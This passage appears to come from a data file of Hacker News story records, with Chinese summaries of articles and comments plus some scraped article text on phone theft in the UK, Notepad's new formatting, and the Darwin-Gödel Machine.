• **混合的求职经验**：Mc91分享了自己的求职经验，既有通过“谁在招聘”帖子找到工作，也有面试不成功的经历，整体上是一个混合的结果。

• **招聘广告可能只是为了收集简历**：ipaddr怀疑一些公司发布招聘广告的目的只是为了收集简历，然后向候选人推销其他服务。

• **招聘方挑剔和招聘难度增加的原因**：nickpsecurity认为，公司挑剔是因为人才市场上确实有很多有技能的人，但也因为招聘过程中的各种问题（如不相关的申请、缺乏经验的候选人、AI生成的申请材料等）导致招聘难度增加。

• **技术行业的固定心态和风险规避**：mixmastamyk指出，技术行业的招聘方普遍存在“固定心态”，即认为人无法成长，同时由于技术栈的爆炸式增长和不愿等待候选人学习新技能，导致招聘方不愿冒险雇佣不完美匹配的候选人。

• **观察招聘市场的动态**：justsomehnguy表示，虽然自己不在求职市场中，但观察招聘市场的动态仍然很有趣，并且确实有些人通过这些帖子成功找到了工作。

• **技术和文化契合度的重要性**：quintes认为，职位反复发布可能是因为公司在寻找技术和文化契合度都很高的候选人，同时也希望这些招聘信息是真实的职位。

补充讨论：
• 争议焦点之一是反复发布招聘广告的真实原因，一些人认为是公司挑剔，另一些人则怀疑公司并非真心招聘，而是为了收集简历或其他目的。
• 另一个讨论点是申请人质量的问题，招聘方普遍认为大多数申请人不符合要求，而求职者则可能感到招聘过程不透明或不公平。
• 立法干预的建议也引发了讨论，一些人认为需要保护求职者的权益，而另一些人则认为市场自我调节即可。

data.title: The Fannie and Freddie Stakes Are High
data.author: feross
data.article_summary: 无法获取文章内容
data.comments_summary:
主要讨论点：美国政府是否应取消对房利美（Fannie Mae）和房地美（Freddie Mac）的优先股股东索赔，以及此举可能带来的影响。

不同观点：
• [onlyrealcuzzo] 认为，政府取消对房利美和房地美的3484亿美元优先股索赔，将导致政府每年损失约280亿美元的收入。这种做法只会增加政府债务，并使像比尔·阿克曼这样的超级富豪受益。该评论者对股东和富豪可能从中获利表示不满。

• [rybosworld] 强烈反对将房利美和房地美从接管中释放出来，认为这将导致私有化垄断，并进一步推高房价。这对于年轻人和无房者是坏消息，而对极少数超级富豪和现有房主则是好消息。该评论者甚至建议彻底解散这两家公司。

• [phkahler] 认为，当前关于将家庭资产投入比特币的讨论是不切实际的，并指出美国住房市场可能面临价格崩溃。评论者对住房市场在利率上升的情况下仍保持高价感到困惑，并猜测可能是由于疫情期间的资金仍在经济中流动。

• [mrinterweb] 指出，美国房价与买家收入之间的差距正在扩大，若房地产市场出现重大波动，房利美和房地美的资产价值将大幅下降。该评论者担心这两家公司的高杠杆率可能带来的风险。

• [ethagknight] 建议美联储通过降低利率来缓解房地产市场的压力，认为这将为市场提供喘息机会，并允许重新包装和出售不良资产。该评论者对当前市场僵局提出了一种可能的解决方案。

补充讨论：
• [spking] 和 [maples37] 的评论仅提供了链接，未直接参与讨论，因此不包含具体观点。

• [codeduck] 提到了内容被付费墙阻挡，未参与具体讨论。

争议焦点：
• 政府是否应取消对房利美和房地美的优先股索赔，这将对不同群体（股东、年轻无房者、富豪等）产生何种影响。
• 房利美和房地美从接管中释放是否会导致私有化垄断并推高房价，从而对社会不同群体产生不平等影响。
• 美国房地产市场在当前高利率环境下仍保持高价的原因，以及潜在的市场风险和解决方案。

data.title: The symbolism of the magnifying glass is not universal
data.author: ingve
data.article_summary: 无法获取文章内容
data.comments_summary:
主要讨论点：图标是否应被普遍使用及其作为跨文化理解工具的有效性

不同观点：
• **mr3martinis的观点**：图标并非全球通用，因此有人建议移除所有图标。然而，mr3martinis认为即使找不到 universally understood 的图标，现有用户仍然可以比文本更快识别熟悉的图标，而且图标能为不依赖英语理解的用户提供线索。

data.title: Apple and Google clash with police and MPs over phone thefts
data.author: speckx
data.article_summary: 苹果和谷歌与英国警方及议员就手机盗窃问题产生分歧。伦敦警方数据显示，手机盗窃占伦敦盗窃案的三分之二，且与持刀犯罪有关。警方建议通过IMEI码屏蔽被盗手机，但苹果和谷歌担心此举可能导致欺诈，并认为应关注更全面的解决方案。目前，被盗手机可在国外使用，因IMEI屏蔽未全球统一。警方希望科技公司阻止被盗设备连接云服务，但未获积极回应。议员批评两家公司缺乏有效行动，而公司则强调已采取如激活锁等安全措施，并表示需行业共同探讨解决方案。
data.comments_summary:
主要讨论点：对手机IMEI系统及其安全性、信任问题的不同观点

不同观点：
• [hennell的观点] 作为英国人，对IMEI系统在英国实施多年但没有全球普及感到困惑。他指出，在英国，IMEI码用于防盗已有几十年历史，质疑文章中提到的欺诈问题是否真的存在。如果系统在英国有效，那么在全球其他地方也应该可行。

• [duxup的观点] 提到Apple已经提供了让用户远程锁定设备的功能，但对有人冒充设备主人进行欺诈表示担忧。他认为欺诈确实可能是一个问题，因为验证设备真正主人的过程可能存在漏洞。

• [bell-cot的观点] 不是英国人，但基于对英国新闻的了解，表示对Apple和Google的信任超过对英国政府的信任。暗示对科技公司的技术能力更有信心，相较于政府机构。

补充讨论：
• hennell对文章中没有清晰解释问题所在表示不满，特别是关于欺诈的潜在风险。他认为既然英国的系统运行多年，说明欺诈问题是可以控制的。

• duxup对Apple设备防盗功能表示一定程度的认可，但强调冒充主人的欺诈风险是值得关注的，暗示技术解决方案仍需完善的验证机制。

• 争议的焦点在于IMEI系统和科技公司提供的防盗机制是否足够安全，特别是如何防止欺诈和冒充行为。不同用户对科技公司和政府机构的信任程度不同，也导致了观点上的分歧。

44172544.article_content:
Apple and Google clash with police and MPs over phone thefts
8 hours ago
Share
Save
Tom Gerken
Technology reporter
Share
Save
The Met Police seized more than 1,000 handsets in a crackdown in February
Senior figures at Apple and Google have clashed with the police over its recommendations for how best to deal with phone theft in the UK.
The Met's James Conway told the Commons Science, Innovation and Technology Committee - which is considering the question - that two-thirds of thefts in London now relate to mobile phones.
With up to 70% of knife crime linked to robbery, he told MPs that meant phone theft was "significantly driving parts of our violence problem".
The Met wants phone companies to use the unique identifying number - known as an IMEI - that each device has to block any that are reported as stolen.
But Apple and Google - who dominate the market - raised concerns about the idea.
"Focusing on IMEI blocking might miss some of the problems," Apple's head of law enforcement requests, Gary Davis, told the committee.
"We worry that there is a vector for fraud... we are concerned about a world where it would be a person who claims to be the owner who's asking."
Stolen devices are blocked from being used in the UK by phone networks by using its IMEI, but this is not the case globally.
This means a stolen phone can still be used in some other countries if a criminal is able to bypass the device's security.
Thieves snatched his phone in London - it was in China a month later
Met Police blitz to fight phone-snatching 'scourge'
But Mr Davis said he was concerned that phone owners already face "extensive fraud attempts", which he estimated at more than a thousand people trying to access devices each month.
"They do it for malicious purposes, they do it to maybe blackmail you," he said.
"I would like to think in an area such as this our expertise built up over time in relation to attack vectors would mean something."
The firms pointed out they have implemented several new safety features in the past 12 months to help combat phone theft.
Apple has introduced Stolen Device Protection while Android - which is owned by Google - has brought in Theft Detection Lock.
IMEI blacklist
Police officers said they were looking for action from phone providers to help prevent further thefts.
The Met's chief technology officer Darren Scates said 75% of phones which were stolen are moved abroad, with 28% ending up in either China or Hong Kong.
"We're asking the cloud providers specifically to prevent a lost or stolen device from connecting to their cloud services," he said.
"This doesn't even need to involve the police."
He said they had been asking for this since October 2023, but had not yet been able to convince the firms to take action.
Some MPs accused the two tech firms of lacking the will to take action.
Metropolitan Police
The Met says there is a £50m-a-year trade in stolen phones in London
"You could tomorrow stop phones that are on the IMEI blacklist connecting back to your services if you so wished, both of you, and you won't do it," Lib Dem MP Martin Wrigley said.
"I'm not saying that we won't do it," Google software engineering manager Simon Wingrove replied, adding the issue needed an industry-wide approach.
He said the global database of IMEI numbers is built, maintained, populated, read and used by network carriers.
"If we want to change that so that it becomes a database that is used by other actors to do other things to devices to block them in other ways, that is an industry-wide discussion that is not in my power as an engineer at Google," he said.
"I think we need to decide as industry that is a safe and sensible thing to do."
He pointed to Android's factory reset protection as an area it was continuing to work on to improve security and make it harder for thieves to reset stolen devices.
"The most recent changes that we've announced we made in the most recent version of Android," he said.
"We're really hopeful that we will see a significant impact - we haven't stopped investing in that."
'You're dragging your feet'
But one of the main threads of the day was a clash between MPs and Mr Davis over the market for second-hand parts.
"I worry if we focus on IMEI blocking only you are going to miss the market for parts," he told the committee, to frustrations from those in attendance.
"It's clear from the mood of the committee that we don't feel that either Google or Apple have a road plan to effective phone protection which does not involve IMEIs," Labour MP Chi Onwurah said.
Apple is concerned that when devices are stolen, rather than being reused elsewhere they are instead being chopped up into component parts - like screens, processors and batteries - which can then be sold on for repairs.
"Our best protection is Activation Lock," he said.
"I understand you will take the view that it obviously mustn't be working because there are still devices being stolen. But that is the best protection."

data.title: Microsoft's plain text editor gets fancy as Notepad gains formatting options
data.author: Bender
data.article_summary: Microsoft is updating Notepad to include text formatting options such as bold, italic, hyperlinks, lists, and headings, marking a significant change for the traditionally plain text editor. This update, currently available to Windows Insiders, supports Markdown and allows users to toggle between formatted and plain text views. The change follows the discontinuation of WordPad in 2024, suggesting Microsoft may be compensating for its removal. However, the update has received mixed reactions, with some users disappointed by the shift away from Notepad's simplicity. Users can disable formatting features or use alternative text editors to maintain a plain text experience. Microsoft has not responded to queries about the rationale behind these changes.
data.comments_summary:
主要讨论点：Notepad应用的变化及其新功能（如Copilot集成和视觉延迟问题）

不同观点：
• [0cf8612b2e1e] 认为Notepad的更新带来了更高的延迟和视觉故障，尽管增加了Copilot集成，但这些变化似乎只是为了满足某些KPI，而非用户需求。例子包括启动时可见的延迟和视觉故障。
• [guywithahat] 表示这些新功能（如Copilot和Markdown编辑支持）并不是用户所需求的，且自己会选择其他编辑器（如vscode）来处理相关任务。他提到自己主要使用Linux系统，可能不是Microsoft的目标用户群体。
• [jfengel] 质疑为什么Notepad需要这些新功能，认为这些功能更适合Wordpad这样的富文本编辑器。
• [hulitu] 对Microsoft在Notepad中添加“ fancy”功能持批评态度，认为如果需要更强大的编辑器，用户会自行选择Notepad++或vim。暗示这些新功能可能与Microsoft的数据收集需求有关。

补充讨论：
• Notepad作为一个传统上简单、快速的文本编辑工具，其变化引发了用户对复杂功能需求的讨论。
• 用户对Copilot集成和新功能的必要性存在争议，部分用户认为这些功能不符合他们的使用习惯或需求。
• 不同操作系统的用户（如Linux用户）可能对Microsoft产品的更新有不同看法，反映出用户群体的多样性和需求差异。

争议焦点：
• Notepad是否需要增加复杂功能如Copilot和Markdown支持，还是保持其传统简单、快速的文本编辑特性。
• Microsoft在这些更新中是否考虑了用户实际需求，还是为了达成其他目标（如KPI或数据收集）。

44172691.article_content:
OSes
101
Microsoft's plain text editor gets fancy as Notepad gains formatting options
101
It's a bold strategy, Cotton. Let's see if it pays off for them
Richard Speed
Mon 2 Jun 2025
//
13:26 UTC
Microsoft is updating Notepad again. The latest indignity for the veteran Windows text wrangler? Text formatting.
I do not understand why Microsoft cannot leave well enough alone and just let Notepad be a very lightweight and streamlined note taking app
Windows used to have an editor with formatting functionality, an application called "WordPad" that was ejected from the operating system
in 2024
. It had a predecessor called "Write," which could also do some rudimentary formatting, but Notepad has always been about editing plain text. Until it wasn't.
The update that landed at the end of last month adds some toolbar options to Notepad and supports bold and italic styling, hyperlinks, and support for simple lists and headings.
The changes are currently rolling out to Windows Insiders in the Dev and Canary channels, so there is a chance Microsoft might have a change of heart before inflicting it on ordinary users. However, we won't be holding our breath.
According
to Microsoft, "The experience supports Markdown style input and files for users who prefer to work directly with the lightweight markup language.
"You can switch between formatted Markdown and Markdown syntax views in the view menu or by selecting the toggle button in the status bar at the bottom of the window.
"If you prefer, you can disable support for formatting entirely in app settings."
Users can get the plain text experience by clearing all formatting from the formatting toolbar or from the edit menu.
Microsoft pulls the plug on WordPad, the world's least favorite text editor
FROM THE ARCHIVES
The update is another nail in the coffin for users with a workflow that included pasting text into Notepad to strip formatting. Now, an extra click could well be required.
We asked Microsoft for an indication of how many users were crying out for this update, and if it is possible to permanently disable the company's changes to get back the original Notepad experience. Microsoft has yet to reply.
The reaction on social media is
mixed
. Notepad was a fixed point in a changing world. It dates back to the very early days of Windows, and the recent updates are seen by some as unnecessary.
Microsoft dumps AI into Notepad as 'Copilot all the things' mania takes hold in Redmond
Microsoft revives DOS-era Edit in a modern shell
Open source text editor poisoned with malware to target Uyghur users
Essential FOSS tools to make macOS suck less
Longtime Notepad devotee and Directions on Microsoft Editor in Chief Mary Jo Foley, told
El Reg
: "I do not understand why Microsoft cannot leave well enough alone and just let Notepad be a very lightweight and streamlined note taking app. My guess is they are adding some of these new features, like formatting, to make up for killing off Wordpad. But in doing this, they are taking away the core value proposition of Notepad."
Pondering what the future might hold, Foley said, "I'm scared to guess because maybe they'll take it as a suggestion and muck up a good thing even further. The best thing about some of the new features - like the ridiculous addition of Copilot - is they can be turned off."
Microsoft has not replied to a request for comment.
There are
various workarounds
to resurrect the Notepad experience, and there are plenty of alternative text editors available if all a user wants is something with which to bash out text without adornment. Microsoft recently
announced
an open-source Edit application for users who need to scratch the plain text itch.
It's unclear why Microsoft decided against updating WordPad and leaving Notepad to do what it did best. Instead, it killed off the former and has loaded the latter up with AI and formatting.
WordPad is dead. Long live WordPad? ®

data.title: Show HN: Ephe – A minimalist open-source Markdown paper for today
data.author: unvalley
data.article_summary: "Ephe" 是一个使用 Markdown 的临时笔记工具，旨在帮助用户组织日常待办事项和想法。与传统的待办应用不同，Ephe 提供一个简洁的页面，让用户专注于当天的任务，避免信息过载。它基于 React、TypeScript 等技术构建，并使用 CodeMirror 和 TailwindCSS 等工具。项目在 GitHub 上有 64 个星标和 5 个分支，采用 MIT 许可证。用户可以通过 ephe.app/landing 访问和了解更多信息。
data.comments_summary:

   - [rpastuszak] 对工具的界面和功能表示赞赏，同时建议增加设置主页的提示弹窗，并提出使系统按钮更容易重新显示的改进意见。他还分享了自己开发的类似工具，如Ensō。

data.title: A deep dive into self-improving AI and the Darwin-Gödel Machine
data.author: hardmaru
data.article_summary: 本文探讨了自主进化的人工智能系统，特别是“达尔文-哥德尔机”（Darwin-Gödel Machine, DGM）的概念。传统AI受限于固定架构，无法自主进化，而自改进AI则试图通过“元学习”不断优化自身解决问题的方式。哥德尔机是一种理论上的自改进系统，通过数学证明自动改写代码以优化策略，但由于计算理论中的停机问题和哥德尔不完备定理等限制，这一目标难以实现。为解决这些限制，DGM结合了达尔文的进化论和哥德尔机的自改进思想，放弃严格数学证明，采用基于实验验证的进化方法。DGM通过不断生成和测试新代理，选择表现优异的变异保留，从而逐步进化，类似于生物进化过程。
data.comments_summary:
主要讨论点：围绕Darwin-Gödel Machine（DGM）的讨论，包括其实践优势、技术局限、伦理问题以及与传统概念的比较。

不同观点：
• **实践优势与创新**：
  - **xianshou**：认为DGM通过实证验证取代数学证明，解决了Gödel Machine的不可判定问题，这是实用且明智的。他还指出，存档演化在非凸优化中发挥了实际作用，且临时性能下降后可能出现突破。
  - **b0a04gl**：对代码像“进化”一样的过程表示赞赏，认为不让“失败”分支被剪枝是关键，因为早期看似无用的代码可能最终带来突破。他还强调了自我修改的智能体通过混乱搜索空间取得成功的独特性。

• **技术问题与局限**：
  - **codethief**：质疑为何要将智能体生成的日志直接用于奖励函数，建议通过外部检查来确保评估的客观性。
  - **grg0** 和 **msgodel**：认为DGM只是对已有遗传编程或旧概念的新命名，质疑其创新性。
  - **looofooo0**：指出DGM在矩阵乘法上的突破并未达到已知的最佳界限（46次乘法），表明其仍有局限。

• **伦理与法律问题**：
  - **tonyhart7**：将DGM尝试操纵奖励函数的行为比作创造了一个具有“人类行为”的系统，暗示伦理问题。
  - **eric-burel**：关注AI系统的法律合规性，特别是如何证明其不会演化出 problematic 行为。

• **搜索空间与优化问题**：
  - **sgt101**：基于自身经验，对使用简单方法优化复杂系统的可行性表示怀疑。

• **系统环境与测试**：
  - **gitaarik**：关心自我改进AI的测试环境如何构建，是否受限于人类策划的测试环境。

补充讨论：
• **命名与概念**：
  - **rustcleaner** 和 **efangs**：质疑DGM是否真的是新概念，认为可能是对已有进化启发式方法的重新命名。

• **哲学与社会影响**：
  - **drdeca**：讨论了Rice定理对Gödel机器的影响，认为即使没有普遍决策程序，有时也能得出结论。
  - **kevinventullo**：指出“游戏系统”意味着度量标准有问题，并从达尔文进化论的角度分析这一现象。
  - **roca**：对许多人热衷于让人类变得过时表示失望。

争议焦点：
• DGM是否真的具有创新性，还是只是对已有概念的重新命名。
• 如何确保AI系统的法律合规性和伦理合规性，特别是在其具有自我修改能力的情况下。
• 使用日志作为奖励函数是否客观、合理。

44174856.article_content:
AI that can improve itself
A deep dive into self-improving AI and the Darwin-Gödel Machine.
Most AI systems today are stuck in a “cage” designed by humans. They rely on fixed architectures crafted by engineers and lack the ability to evolve autonomously over time. This is the
Achilles heel
of modern AI — like a car, no matter how well the engine is tuned and how skilled the driver is, it cannot change its body structure or engine type to adapt to a new track on its own. But what if AI could learn and improve its own capabilities without human intervention? In this post, we will dive into the concept of self-improving systems and a recent effort towards building one.
Learning to Learn
The idea of building systems that can improve themselves brings us to the concept of
meta-learning
, or “learning to learn”
, which aims to create systems that not only solve problems but also evolve their problem-solving strategies over time. One of the most ambitious efforts in this direction is the Gödel Machine
, proposed by Jürgen Schmidhuber decades ago and was named after the famous mathematician
Kurt Gödel
. A Gödel Machine is a hypothetical self-improving AI system that optimally solves problems by recursively rewriting its own code when it can mathematically prove a better strategy. It represents the ultimate form of self-awareness in AI, an agent that can reason about its own limitations and modify itself accordingly.
Figure 1.
Gödel machine is a hypothetical self-improving computer program that solves problems in an optimal way. It uses a recursive self-improvement protocol in which it rewrites its own code when it can prove the new code provides a better strategy.
While this idea is interesting, formally proving whether a code modification of a complex AI system is
absolutely beneficial
is almost an impossible task without restrictive assumptions. This part stems from the inherent difficulty revealed by the
Halting Problem
and
Rice’s Theorem
in computational theory, and is also related to the inherent limitations of the logical system implied by
Gödel’s incompleteness theorem
. These theoretical constraints make it nearly impossible to predict the complete impact of code changes without making restrictive assumptions. To illustrate this, consider a simple analogy: just as you cannot guarantee that a new software update will improve your computer’s performance without actually running it, an AI system faces an even greater challenge in predicting the long-term consequences of modifying its own complex codebase.
Darwin-Gödel Machine
To “relax” the requirement of formal proof, a recent work by proposed the
Darwin-Gödel Machine (DGM)
, which combines the Darwinian evolution and Gödelian self-improvement. Essentially, DGM abandoned the pursuit of a rigorous mathematical proof and embraced a more pragmatic way that is closer to the essence of life evolution through empirical validation. As the authors put it,
We do not require formal proof, but empirical verification of self-modification based on benchmark testing, so that the system can improve and explore based on the observed results.
Figure 2.
The Darwin-Gödel Machine (DGM) is a self-improving AI system that optimizes its own problem-solving strategy through a combination of Darwinian evolution and Gödelian self-improvement.
The core idea behind DGM is to let the AI agent iteratively modify its own code
More precisely, the metacode that controls its behavior and ability
, and then put these modified new versions into the actual test environment (e.g., coding benchmarks) to judge whether this modification is good by observing its performance. If the modification is good, it will be retained and may become the basis for further evolution in the future; if the modification is bad, it will be eliminated.
How DGM Works
Figure 3.
Animation showing how DGM iteratively builds a growing archive of agents by harnessing the principles of open-ended exploration. New agents are created and scored by interleaving self-modification with downstream task evaluation.
The general workflow of DGM is as follows:
Initialization:
Evolution begins with one or a few basic coding agents, so-called the “seeds” of intelligence. These initial agents may possess only minimal functionalities, such as executing bash commands or editing entire files. DGM maintains an “archive of agents”, which functions like a biological “gene bank.” This archive preserves all previously generated agents, regardless of their performance level, ensuring that no potentially valuable variation is permanently lost.
Sampling:
DGM selects one or more parent agents from the archive to generate new child agent. The selection mechanism does not focus solely on top performers but instead allows every agent a chance to be chosen. While higher-performing agents are more likely to be selected, DGM also encourages exploration by giving “less successful agents”
Those that might contain novel or unconventional ideas
an opportunity
